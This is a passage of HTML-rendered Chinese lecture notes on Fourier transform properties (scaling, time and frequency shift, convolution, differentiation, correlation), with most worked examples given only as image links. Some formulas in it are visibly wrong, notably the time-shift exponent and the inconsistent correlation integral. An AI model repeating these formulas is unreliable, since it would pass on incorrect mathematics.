cjk_fallback">：</span><span class="mord cjk_fallback">若</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">↔</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="mclose">)</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">则</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mord mathdefault">t</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">↔</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mord mathdefault" style="margin-right:0.03588em;">π</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord">−</span><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="mclose">)</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4.</mn><mtext>尺度变换特征：若</mtext><mi>f</mi><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo><mo>↔</mo><mi>F</mi><mo stretchy="false">(</mo><mi>ω</mi><mo stretchy="false">)</mo><mtext>，则</mtext><mi>f</mi><mo stretchy="false">(</mo><mi>a</mi><mi>t</mi><mo stretchy="false">)</mo><mo>↔</mo><mfrac><mn>1</mn><mrow><mi mathvariant="normal">∣</mi><mi>a</mi><mi mathvariant="normal">∣</mi></mrow></mfrac><mi>F</mi><mo stretchy="false">(</mo><mi>j</mi><mfrac><mi>ω</mi><mi>a</mi></mfrac><mo stretchy="false">)</mo><mtext>，</mtext><mi>a</mi><mtext>为非零实数</mtext></mrow><annotation encoding="application/x-tex">4.尺度变换特征：若f(t)\leftrightarrow F(\omega)，则f(at)\leftrightarrow \frac{1}{|a|}F(j\frac{\omega}{a})，a为非零实数</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">4</span><span class="mord">.</span><span class="mord cjk_fallback">尺</span><span class="mord cjk_fallback">度</span><span class="mord cjk_fallback">变</span><span class="mord cjk_fallback">换</span><span class="mord cjk_fallback">特</span><span class="mord cjk_fallback">征</span><span class="mord cjk_fallback">：</span><span class="mord cjk_fallback">若</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">↔</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="mclose">)</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">则</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">↔</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.365108em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∣</span><span class="mord mathdefault mtight">a</span><span class="mord mtight">∣</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">a</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">ω</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">)</span><span class="mord cjk_fallback">，</span><span class="mord mathdefault">a</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">非</span><span class="mord cjk_fallback">零</span><span class="mord cjk_fallback">实</span><span class="mord cjk_fallback">数</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5.</mn><mtext>时移特性：若</mtext><mi>f</mi><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo><mo>↔</mo><mi>F</mi><mo stretchy="false">(</mo><mi>j</mi><mi>ω</mi><mo stretchy="false">)</mo><mtext>，则</mtext><mi>f</mi><mo stretchy="false">(</mo><mi>t</mi><mo>±</mo><msub><mi>t</mi><mn>0</mn></msub><mo stretchy="false">)</mo><mo>↔</mo><msup><mi>e</mi><mrow><mo>±</mo><mi>j</mi><mi>a</mi><msub><mi>ω</mi><mn>0</mn></msub></mrow></msup><mi>F</mi><mo stretchy="false">(</mo><mi>j</mi><mi>ω</mi><mo stretchy="false">)</mo><mtext>，</mtext><msub><mi>t</mi><mn>0</mn></msub><mtext>为实常数。</mtext><mspace linebreak="newline"></mspace><mtext>若</mtext><mi>F</mi><mo stretchy="false">(</mo><mi>j</mi><mi>ω</mi><mo stretchy="false">)</mo><mo>=</mo><mi mathvariant="normal">∣</mi><mi>F</mi><mo stretchy="false">(</mo><mi>j</mi><mi>ω</mi><mo stretchy="false">)</mo><mi mathvariant="normal">∣</mi><msup><mi>e</mi><mrow><mi>j</mi><mi>φ</mi><mo stretchy="false">(</mo><mi>ω</mi><mo stretchy="false">)</mo></mrow></msup><mtext>，则</mtext><mi>f</mi><mo stretchy="false">(</mo><mi>t</mi><mo>±</mo><msub><mi>t</mi><mn>0</mn></msub><mo stretchy="false">)</mo><mo>↔</mo><mi mathvariant="normal">∣</mi><mi>F</mi><mo stretchy="false">(</mo><mi>j</mi><mi>ω</mi><mo stretchy="false">)</mo><mi mathvariant="normal">∣</mi><mo separator="true">⋅</mo><msup><mi>e</mi><mrow><mi>j</mi><mo stretchy="false">[</mo><mi>φ</mi><mo stretchy="false">(</mo><mi>ω</mi><mo stretchy="false">)</mo><mo>±</mo><mi>ω</mi><msub><mi>t</mi><mn>0</mn></msub><mo stretchy="false">]</mo></mrow></msup></mrow><annotation encoding="application/x-tex">5.时移特性：若f(t)\leftrightarrow F(j\omega)，则f(t\pm t_{0})\leftrightarrow e^{\pm ja\omega_{0}}F(j\omega)，t_{0}为实常数。\\若F(j\omega)=|F(j\omega)|e^{j\varphi(\omega)}，则f(t\pm t_{0})\leftrightarrow|F(j\omega)|·e^{j[\varphi(\omega)\pm\omega t_{0}]}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">5</span><span class="mord">.</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">移</span><span class="mord cjk_fallback">特</span><span class="mord cjk_fallback">性</span><span class="mord cjk_fallback">：</span><span class="mord cjk_fallback">若</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">↔</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="mclose">)</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">则</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">±</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">↔</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0746639999999998em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.824664em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">±</span><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span><span class="mord mathdefault mtight">a</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">ω</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:-0.03588em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="mclose">)</span><span class="mord cjk_fallback">，</span><span class="mord"><span class="mord mathdefault">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">实</span><span class="mord cjk_fallback">常</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">。</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">若</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.138em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="mclose">)</span><span class="mord">∣</span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8879999999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span><span class="mord mathdefault mtight">φ</span><span class="mopen mtight">(</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">ω</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">则</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">±</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">↔</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.138em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="mclose">)</span><span class="mord">∣</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8879999999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span><span class="mopen mtight">[</span><span class="mord mathdefault mtight">φ</span><span class="mopen mtight">(</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">ω</span><span class="mclose mtight">)</span><span class="mbin mtight">±</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">ω</span><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mclose mtight">]</span></span></span></span></span></span></span></span></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>6.</mn><mtext>频移特性：若</mtext><mi>f</mi><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo><mo>↔</mo><mi>F</mi><mo stretchy="false">(</mo><mi>j</mi><mi>ω</mi><mo stretchy="false">)</mo><mtext>，则</mtext><msup><mi>e</mi><mrow><mstyle mathcolor="red"><mo>∓</mo></mstyle><mi>j</mi><msub><mi>ω</mi><mn>0</mn></msub><mi>t</mi></mrow></msup><mi>f</mi><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo><mo>↔</mo><mi>F</mi><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">(</mo><mi>ω</mi><mstyle mathcolor="red"><mo>±</mo></mstyle><msub><mi>ω</mi><mn>0</mn></msub><mo stretchy="false">)</mo><mo stretchy="false">]</mo><mtext>，</mtext><msub><mi>ω</mi><mn>0</mn></msub><mtext>为实常数。</mtext></mrow><annotation encoding="application/x-tex">6.频移特性：若f(t)\leftrightarrow F(j\omega)，则e^{\textcolor{red}{\mp }j\omega_{0}t}f(t)\leftrightarrow F[j(\omega\textcolor{red}{\pm }\omega_{0})]，\omega_{0}为实常数。</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">6</span><span class="mord">.</span><span class="mord cjk_fallback">频</span><span class="mord cjk_fallback">移</span><span class="mord cjk_fallback">特</span><span class="mord cjk_fallback">性</span><span class="mord cjk_fallback">：</span><span class="mord cjk_fallback">若</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">↔</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0746639999999998em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="mclose">)</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">则</span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.824664em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="color:red;">∓</span><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">ω</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:-0.03588em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mathdefault mtight">t</span></span></span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">↔</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin" style="color:red;">±</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mclose">]</span><span class="mord cjk_fallback">，</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">实</span><span class="mord cjk_fallback">常</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">。</span></span></span></span></p><h1>傅里叶变换的性质2</h1><h2 id="delta卷积定理"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Δ</mi></mrow><annotation encoding="application/x-tex">\Delta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">Δ</span></span></span></span>卷积定理</h2><img src="C:/Users/zhangguozhi/AppData/Roaming/Typora/typora-user-images/image-20221004164913587.png" alt="image-20221004164913587" style="zoom:50%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004165600826.png" alt="image-20221004165600826" style="zoom:50%;" /><h3 id="例1">例1</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004165748615.png" alt="image-20221004165748615" style="zoom:50%;" /><h3 id="delta例2"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Δ</mi></mrow><annotation encoding="application/x-tex">\Delta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">Δ</span></span></span></span>例2</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004170846860.png" alt="image-20221004170846860" style="zoom:50%;" /><p><font color="red">没听懂调频……4.22卷积定理</font></p><p>调频比调幅好，失真小。调频：频率随着要传出的信息变化。同步解调</p><h2 id="时域微积分特性">时域微积分特性</h2><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004185117186.png" alt="image-20221004185117186" style="zoom:50%;" /><h3 id="例1">例1</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004185209270.png" alt="image-20221004185209270" style="zoom:50%;" /><h3 id="推论1">推论1</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004185332465.png" alt="image-20221004185332465" style="zoom:50%;" /><h3 id="推论2">推论2</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004185416193.png" alt="image-20221004185416193" style="zoom:50%;" /><h2 id="频域微积分性质">频域微积分性质</h2><p><strong>解决频域求得n阶导数对应时间函数和原函数关系问题</strong></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004185512894.png" alt="image-20221004185512894" style="zoom:50%;" /><h3 id="例2">例2</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004185538386.png" alt="image-20221004185538386" style="zoom:50%;" /><h2 id="相关原理">相关原理</h2><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1.</mn><mtext>互相关函数</mtext><mo>→</mo><msub><mi>f</mi><mn>1</mn></msub><mtext>和</mtext><msub><mi>f</mi><mn>2</mn></msub><mtext>不相同</mtext></mrow><annotation encoding="application/x-tex">1.互相关函数\rightarrow f_{1}和f_{2}不相同</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">.</span><span class="mord cjk_fallback">互</span><span class="mord cjk_fallback">相</span><span class="mord cjk_fallback">关</span><span class="mord cjk_fallback">函</span><span class="mord cjk_fallback">数</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">和</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">相</span><span class="mord cjk_fallback">同</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>时域相关运算：</mtext><msub><mi>R</mi><mn>12</mn></msub><mo stretchy="false">(</mo><mi>τ</mi><mo stretchy="false">)</mo><mo>=</mo><msubsup><mo>∫</mo><mrow><mo>−</mo><mi mathvariant="normal">∞</mi></mrow><mrow><mo>+</mo><mi mathvariant="normal">∞</mi></mrow></msubsup><msub><mi>f</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>τ</mi><mo stretchy="false">)</mo><msub><mi>f</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>t</mi><mo>−</mo><mi>τ</mi><mo stretchy="false">)</mo><mi>d</mi><mi>t</mi><mo>=</mo><msub><mi>f</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo><mo>∗</mo><msub><mi>f</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mo>−</mo><mi>τ</mi><mo stretchy="false">)</mo><mspace width="2em"/><mtext>时域的卷积</mtext><mo>=</mo><mtext>频域的乘法运算</mtext></mrow><annotation encoding="application/x-tex">时域相关运算：R_{12}(\tau)=\int_{-\infty}^{+\infty}f_{1}(\tau)f_{2}(t-\tau)dt=f_{1}(t)*f_{2}(-\tau)\qquad时域的卷积=频域的乘法运算</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">域</span><span class="mord cjk_fallback">相</span><span class="mord cjk_fallback">关</span><span class="mord cjk_fallback">运</span><span class="mord cjk_fallback">算</span><span class="mord cjk_fallback">：</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.1132em;">τ</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.380382em;vertical-align:-0.41415100000000005em;"></span><span class="mop"><span class="mop op-symbol small-op" style="margin-right:0.19445em;position:relative;top:-0.0005599999999999772em;">∫</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9662310000000001em;"><span style="top:-2.34418em;margin-left:-0.19445em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">∞</span></span></span></span><span style="top:-3.2579000000000002em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">+</span><span class="mord mtight">∞</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" 